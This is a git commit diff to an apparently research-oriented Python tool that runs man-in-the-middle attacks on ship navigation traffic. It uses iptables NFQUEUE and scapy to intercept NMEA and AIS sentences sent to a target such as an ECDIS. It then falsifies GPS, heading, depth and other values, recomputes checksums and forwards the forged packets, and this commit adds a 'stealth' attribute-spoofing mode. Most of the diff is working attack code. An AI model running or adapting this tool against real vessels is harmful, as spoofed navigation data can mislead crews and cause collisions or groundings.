86ff8121e8f133d76e78d62a92acc59c2745119f
iam-7 <rajaguru598@gmail.com>
2022-07-18 03:47:29 -0400

    some changes

---
+++ att_config_test.py
@@ -0,0 +1,60 @@
+from pprint import pprint
+from NMEA import NMEA
+import json
+from Attributes import attributes
+config_data = json.load(open('mitm_config.json', 'r'))
+
+data_set = [
+# "$GPRMC,090919.634,A,3500.0,S,13830.0,E,5.0,15.0,220622,,,*03",
+# "$IIVHW,15.0,T,15.0,M,5.0,N,9.3,K*5A",
+# "$GPVTG,15.0,T,15.0,M,5.0,N,9.3,K*41",
+"$IIHDT,15.0,T*16",
+"$GPGLL,3500.0,S,13830.0,E,090919.634,A*2F",
+"$GPGGA,090919.634,3500.0,S,13830.0,E,1,4,1.5,2.0,M,,,,*26",
+"$GPGSA,A,3,8,11,15,22,,,,,,,,,1.5,1.5,1.5*0A",
+"$GPZDA,090919.634,22,06,2022,-04,00*72",
+"!AIVDO,1,1,,A,17PaewhP0jar0;1cv@h0UPNV0000,0*5A",
+"!AIVDM,1,1,,A,17PaewhP0jar0;1cv@h0UPNV0000,0*58",
+"!AIVDM,1,1,,A,13HOI:0P0000VOHLCnHQKwvL05Ip,0*23",
+"!AIVDM,1,1,,A,133sVfPP00PD>hRMDH@jNOvN20S8,0*7F",
+"!AIVDM,1,1,,B,100h00PP0@PHFV`Mg5gTH?vNPUIp,0*3B",
+"$WIMWD,285.0,T,285.0,M,11.0,N,5.7,M*68",
+"$WIMWV,294.4,R,12.1,N,A*1A",
+"$IIMTW,7.5,C*21",
+"$SDDPT,8.0,0.3*5C",
+"$SDDBT,26.2,f,8.0,M,4.4,F*38",
+    #"$SDDBK,26.2,f,8.0,M,4.4,F*27",
+"$SDDBS,26.2,f,8.0,M,4.4,F*3F",
+# "!AIVDO,2,1,9,A,57Paewh00001<To7;?@plD5<Tl0000000000000U1@:551c992TnA3QF,0*6A",
+# "!AIVDO,2,2,9,A,@00000000000002,2*5D",
+# "!AIVDM,2,1,9,A,57Paewh00001<To7;?@plD5<Tl0000000000000U1@:551c992TnA3QF,0*68",
+# "!AIVDM,2,2,9,A,@00000000000002,2*5F",
+"$IIRPM,E,1,0,10.5,A*7C",
+"$IIRPM,E,2,0,10.5,A*7F"
+]
+config_data = json.load(open('attr_config.json', 'r'))
+
+targets = list(config_data["attributes"])
+print(targets)
+for data in data_set:
+    #print(data)
+    sentence_type = data.split(",")[0][3:]
+    attr_to_modify = list()
+    for attr in targets:
+        if sentence_type in attributes.keys() and attr['key'] in attributes[sentence_type]:
+            attr_to_modify.append(attr)
+    
+    if len(attr_to_modify) > 0:
+        print(data)
+        nmea_obj = NMEA(sentence = data)
+        nmea_obj.decode()
+        for attr in attr_to_modify:
+            if attr['incremental']:
+                nmea_obj.modify_attr(attr['key'], str(float(nmea_obj.data[attr['key']]) + attr['value']))            
+            else:
+                nmea_obj.modify_attr(attr['key'], attr['value'])
+        #data = str(nmea_obj.sentence)
+        print(str(nmea_obj.sentence))
+        print()
+
+
--- nmea_attacks.py
+++ nmea_attacks.py
@@ -10,9 +10,9 @@ import argparse
 from pyais import *
 from NMEA import NMEA
 import json
+from Attributes import attributes
 
-nmea_data = None
-curr_index = 0
+gps_attr_targets = None
 
 class MITM:
     def __init__(self, target_ip,  src_ip, option, config_data = None):
@@ -23,8 +23,9 @@ class MITM:
         self.nfqueue = NetfilterQueue()
         self.pkt = None
         self.config_data = config_data
-        self.target_sentences = list(config_data.keys()) if config_data else None
+        self.target_sentences = list(config_data.keys()) if option == "M" and config_data else None
         self.option = option
+        self.target_attr = list(config_data["attributes"]) if option == "A" and config_data else None
 
     def sniff(self, packet):
             
@@ -39,7 +40,6 @@ class MITM:
                 print(f"[*] Packet Intercepted with payload \n{payload}")
             
             packet.accept()
-
 
     def modify(self, packet):
         
@@ -87,52 +87,62 @@ class MITM:
 
         packet.accept()
        
-    def inject(self, packet):
-        global curr_index
+    def stealth(self, packet):
+        
         pkt = packet.get_payload()
         pktIP = IP(pkt)
         
-        #payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
+        payload = "".join(map(chr, bytes(pktIP[TCP].payload)))
         
         try:
             if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000:
                 print("-"*20)
-                #sentence_type = payload.split(",")[0][1:]
-
-                #if sentence_type in self.target_sentences:
-
-                #print(f"[*] Packet Intercepted with payload \n{payload}")
-
-                old_len = len(pktIP[TCP].payload)
+                sentence_type = payload.split(",")[0][3:]
+                attr_to_modify = list()
+                for attr in self.target_attr:
+                    if sentence_type in attributes.keys() and attr['key'] in attributes[sentence_type]:
+                        attr_to_modify.append(attr)
                 
-                #print(nmea_obj.sentence)
-                if curr_index < len(nmea_data):
-
-                    pktIP[TCP].add_payload(nmea_data[curr_index])
-                print(curr_index)
-                print(f"\n[*] New Payload Injected and sending...\n{pktIP[TCP].payload}\n")
-                curr_index += 1
-                new_len = len(pktIP[TCP].payload)
-                pktIP[IP].len = pktIP[IP].len + (new_len - old_len)
-                del pktIP[IP].chksum
-                del pktIP[TCP].chksum
+                if len(attr_to_modify) > 0:    
+                    print(f"[*] Packet Intercepted with payload \n{payload}")
                 
-                pkt = pktIP.__class__(bytes(pktIP))
-                packet.set_payload(bytes(pkt))
+                    old_len = len(pktIP[TCP].payload)
+                    pktIP[TCP].remove_payload()
+                    
+                    nmea_obj = NMEA(sentence=payload)
+                    nmea_obj.decode()
+
+                    for attr in attr_to_modify:
+                        if attr['incremental']:
+                            nmea_obj.modify_attr(attr['key'], str(float(nmea_obj.data[attr['key']]) + attr['value']))            
+                        else:
+                            nmea_obj.modify_attr(attr['key'], attr['value'])
+                                
+                    #print(nmea_obj.sentence)
+                    pktIP[TCP].add_payload(str(nmea_obj.sentence))
+                    print(f"\n[*] Payload modified and sending...\n{nmea_obj.sentence}\n")
+                    
+                    new_len = len(pktIP[TCP].payload)
+                    pktIP[IP].len = pktIP[IP].len + (new_len - old_len)
+                    del pktIP[IP].chksum
+                    del pktIP[TCP].chksum
+                    
+                    pkt = pktIP.__class__(bytes(pktIP))
+                    packet.set_payload(bytes(pkt))
 
         except Exception as e:
            print(e)
 
         packet.accept()
-        
+
 
     def setup(self):
         iptable_config = f"sudo iptables -A FORWARD -j NFQUEUE --queue-num 0 -d {self.target_ip}"
         os.system(iptable_config)
         if self.option == "M":
             self.nfqueue.bind(0, self.modify)
-        elif self.option == "I":
-            self.nfqueue.bind(0, self.inject)
+        elif self.option == "A":
+            self.nfqueue.bind(0, self.stealth)
         elif self.option == "S":
             self.nfqueue.bind(0, self.sniff)
 
@@ -150,8 +160,8 @@ def get_input():
     parser.add_argument("-t", "--target-ip", help="Target system IP address (Eg: ECDIS)", required=True)
     parser.add_argument("-s", "--source-ip", help="Source system IP address", required=True)
     parser.add_argument("-c", "--config", help="JSON config file")
-    parser.add_argument("-o", "--option", help="M - mitm nmea modification attack\nI - nmea data injection attack from file\nS - Sniffing attack", required=True)
-    parser.add_argument("-f", "--filename", help="nmea data source file")
+    parser.add_argument("-o", "--option", help="M - mitm nmea modification attack\nA - stealth GPS nmea attribute attack\nS - Sniffing attack", required=True)
+   # parser.add_argument("-a", "--attr", help="nmea GPS attribute comma separated names")
 
     args = parser.parse_args()
     return args
@@ -159,17 +169,18 @@ def get_input():
 def read_config(config_file):
     return json.load(open(config_file,'r'))
 
-def read_file(filename):
-    global nmea_data
-    nmea_data = open(filename,'r').readlines()
+# # def read_attr(attrs):
+#     global gps_attr_targets
+#     gps_attr_targets = attrs.split(",")
+#     return gps_attr_targets
 
 if __name__ == '__main__':
     args = get_input()
-    if args.option == "I" and args.filename:
-        read_file(args.filename)
-    elif args.option == "I" and not args.filename:
-        print("No input file specified for injection")
-        exit()
+    # if args.option == "I" and args.filename:
+    #     read_file(args.filename)
+    # elif args.option == "I" and not args.filename:
+    #     print("No input file specified for injection")
+    #     exit()
 
     mitm = MITM(args.target_ip, args.source_ip, args.option, read_config(args.config) if args.config else None)
     mitm.setup()
